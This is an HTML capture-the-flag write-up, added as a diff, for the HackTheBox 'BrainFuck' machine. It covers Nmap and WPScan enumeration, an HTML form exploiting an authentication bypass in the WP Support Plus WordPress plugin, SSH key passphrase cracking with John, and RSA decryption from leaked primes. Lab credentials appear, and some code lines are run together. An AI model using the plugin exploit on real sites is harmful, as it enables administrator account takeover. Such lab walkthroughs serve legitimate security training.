@@ -1,0 +1,266 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<h1 id="brainfuck">BrainFuck</h1>
+<p>The BrainFuck was a nice quick box to go through on the hackthebox site. It was rated insane but it felt more like a medium box. The box had 2 virtual name servers which had two different sites. One was Wordpress and the other was text forum based on flarum. We had to exploit both the servers to gain SSH access to the box. The box also had an SMTP server that was not intended for exploitation but to merely interact. so let’s get started!</p>
+<h2 id="nmap">Nmap</h2>
+<p>we start with the Nmap scan, so see which all ports are open on the box.</p>
+<pre><code># Nmap 7.80 scan initiated Thu Mar 26 22:25:36 2020 as: Nmap -sC -sV -oN Nmap/brainfuck 10.10.10.17
+Nmap scan report for 10.10.10.17
+Host is up (0.41s latency).
+Not shown: 995 filtered ports
+PORT    STATE SERVICE    VERSION
+22/tcp  open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
+|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
+|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
+25/tcp  open  smtp?
+|_smtp-commands: Couldn&#39;t establish connection on port 25
+110/tcp open  pop3       Dovecot pop3d
+143/tcp open  tcpwrapped
+443/tcp open  https      nginx/1.10.0 (Ubuntu)
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Not valid before: 2017-04-13T11:19:29
+|_Not valid after:  2027-04-11T11:19:29
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar 26 22:27:18 2020 -- 1 IP address (1 host up) scanned in 101.55 seconds</code></pre>
+<p>The Nmap reveals some interesting ports such as 25 and 110 which are for SMTP <em>(Simple Mail Transfer Protocol)</em> and POP <em>(Post Office Protocol)</em> respectively. Since port 443 which https is also open let’s start with that as it has a wider attack surface.</p>
+<h2 id="webpage-enumeration">WebPage Enumeration</h2>
+<p>The webpage by default showed the Nginx default page. So let’s start with examing the SSL certificate for information such as usernames, email, domain name, etc. On examining the SSL certificate we found an email address and some DNS names</p>
+<pre><code>E = orestis@brainfuck.htb
+CN = brainfuck.htb
+OU = IT
+O = Brainfuck Ltd.
+L = Athens
+ST = Attica
+C = GR
+======================================
+DNS Name: www.brainfuck.htb
+DNS Name: sup3rs3cr3t.brainfuck.htb</code></pre>
+<p>Now lets update our /etc/hosts file with these enteries and examine the webpage again. Now we find two different content manager running on the two dns names.</p>
+<p>The www.brainfuck.htb has a WordPress running so we will use wpscan to examine it and the other has text forum which on some googling around revealed was running flarum. The text forum looks like it will require login credentials for further enumeration. Thus we will ignore it for now.</p>
+<p>Examining the wordpress scan output we get a bunch of details.</p>
+<pre><code>_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.9
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+URL: https://brainfuck.htb/ [10.10.10.17]
+Started: Fri Mar 27 18:07:57 2020
+
+Interesting Finding(s):
+
+Headers
+ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+https://brainfuck.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+https://brainfuck.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+    WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+ |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+
+ WordPress theme in use: proficient
+ | Location: https://brainfuck.htb/wp-content/themes/proficient/
+ | Last Updated: 2020-03-02T00:00:00.000Z
+ | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
+ |     The version is out of date, the latest version is 3.0.15
+ | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
+ | Style Name: Proficient
+ | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
+ | Author: Specia
+ | Author URI: https://speciatheme.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0.6 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: &#39;Version: 1.0.6&#39;
+
+ Enumerating All Plugins (via Passive Methods)
+ Checking Plugin Versions (via Passive and Aggressive Methods)
+
+ Plugin(s) Identified:
+
+ wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ |     The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.1.3 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+Enumerating Config Backups (via Passive and Aggressive Methods)
+
+ Checking Config Backups -: |========================================================================================================================================|
+
+ No Config Backups Found.
+
+ No WPVulnDB API Token given, as a result, vulnerability data has not been output.
+ You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+ Finished: Fri Mar 27 18:08:13 2020
+ Requests Done: 53
+ Cached Requests: 5
+ Data Sent: 11.692 KB
+ Data Received: 161.223 KB
+ Memory used: 182.68 MB
+ Elapsed time: 00:00:15</code></pre>
+<p>we find that WordPress is vulnerable to the exploit https://www.exploit-db.com/exploits/41006 which will give the admin token with the password. Thus editing the exploit to suit our needs will giving us the following exploit code.</p>
+<pre><code>&lt;form method=&quot;post&quot; action=&quot;http://www.brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;
+    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;administrator&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;sth&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;</code></pre>
+<p>Save it in a html file and open it with firefox and once done, go to wp-admin to view the dashboard. Enumerating the wordpress dashboard we find the smtp password. You view its value by using web browser’s tool and inspecting the value. We get the credentials as</p>
+<pre><code>username: orestis@brainfuck.htb
+password: kHGuERB29DNiNE</code></pre>
+<h2 id="smtp-enumeration">SMTP Enumeration</h2>
+<p>Since we SMTP credentials now let’s open the <strong>Blue Bird</strong> and login into the SMTP server. Login is fairly simple.</p>
+<p>Just log in with username <strong>orestis</strong> and email as <strong>orestis@brainfuck.htb</strong> and password.</p>
+<p>Once in we find an email talking about the credentials of the text forum we found earlier. We find the credentials as the following.</p>
+<pre><code>username: orestis
+password: kIEnnfEKJ#9UmdO</code></pre>
+<h2 id="the-text-forum">The Text Forum</h2>
+<p>Exploring the text forum we find them talking about the SSH Key in some sort of vignere encrypted key. Using Open Source tools such as dcode.fr does not work as we don’t know the key. But we have something that looks like a URL.</p>
+<p>Since it is a URL and has 4 letters in the starting then it must start with https. Based on that we can derive a partial key, which in our case will be</p>
+<pre><code>FUCKM</code></pre>
+<p>Now using the dcode.fr we can derive the rest of the key. Enter this key in <strong>Knowing Partial Key</strong> section and paste the encrypted text. Thus we will rest of the key as:</p>
+<pre><code>FUCKMYBRAIN</code></pre>
+<p>Now since we know the Vignere key let’s get ssh key URL and download the key.</p>
+<h2 id="getting-shell">Getting Shell</h2>
+<p>Once we get the SSH key it is encrypted with some password. Using ssh2john to convert the key to a hash and then using john with the RockYou wordlist gets us the password.</p>
+<pre><code>ssh2john id.rsa &gt; hash
+john --wordlist=~/rockyou hash
+
+password found: 3poulakia!
+</code></pre>
+<p>We use that password and boom! we are in. And can read the user.txt file</p>
+<pre><code>cat user.txt
+2c11cfbc5b959f73ac15a3310bd097c9</code></pre>
+<h2 id="privelege-escalation">Privelege Escalation</h2>
+<p>In the home direcotry of the user <strong>orestis</strong> we find a file named encrypt.sage . On some enumeration, I found that it a scientific mathematical programming language that is used to calculations. But fortunately, it looks an RSA implementation and python can be used to decode the encrypted file.</p>
+<pre><code>nbits = 1024password = open(&quot;/root/root.txt&quot;).read().strip()
+enc_pass = open(&quot;output.txt&quot;,&quot;w&quot;)
+debug = open(&quot;debug.txt&quot;,&quot;w&quot;)
+m = Integer(int(password.encode(&#39;hex&#39;),16))p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+n = p*q
+phi = (p-1)*(q-1)
+e = ZZ.random_element(phi)
+while gcd(e, phi) != 1:
+    e = ZZ.random_element(phi)c = pow(m, e, n)
+enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\n&#39;)
+debug.write(str(p)+&#39;\n&#39;)
+debug.write(str(q)+&#39;\n&#39;)
+debug.write(str(e)+&#39;\n&#39;)
+</code></pre>
+<p>We have the things need to decode the RSA in debug file. So decoding the RSA encrypted text it should give us the root.txt file hash.</p>
+<p>I wrote a script in python that will help us to decode this RSA encryption.</p>
+<pre><code>from Crypto.Util.number import inverse, long_to_bytes
+
+p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+
+enc = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+
+phi = (p-1)*(q-1)
+d = inverse(e,phi)
+
+mess = pow(enc,d,p*q)
+mess = hex(mess)
+print mess
+print &quot;password found&quot;
+print str(mess).split(&#39;0x&#39;)[1][:-1].decode(&#39;hex&#39;)</code></pre>
+<p>Thus this gives the root.txt hash. I tired to get the root shell but it was not intended and i did’nt find any reliable path.</p>
+<p>Thus this was the box and will upload other linux OSCP boxes later.</p></body>
+</html>
